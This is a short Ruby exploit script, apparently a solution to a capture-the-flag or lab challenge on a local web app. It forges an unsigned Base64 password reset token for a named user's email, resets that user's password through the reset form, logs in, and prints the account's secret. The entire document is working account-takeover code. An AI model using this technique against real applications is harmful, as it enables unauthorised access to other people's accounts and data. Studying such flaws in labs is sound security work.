#!/usr/bin/env ruby

require 'base64'
require 'mechanize'

# Strategy: change j.ostermans password by crafting a password reset token
target_email    = 'j.osterman@watchmen.net'
target_password = '12345678'

# Craft a password reset token for target email
token = "email=#{target_email}&expires=#{Time.now.to_i + 3600}"
encoded_token = Base64.urlsafe_encode64(token)

Mechanize.new.instance_eval do
  # Access the password reset form with the generated token
  get "http://localhost:3000/password_reset/new?token=#{encoded_token}"

  # Submit the form with a new password
  page.forms.first.tap do |f|
    f['user[password]']              = target_password
    f['user[password_confirmation]'] = target_password
    f.submit
  end

  # Login with the new password
  page.forms.first.tap do |f|
    f['email']    = target_email
    f['password'] = target_password
    f.submit
  end

  # Extract the secret from the page
  puts page.search('.secret').text.strip
end
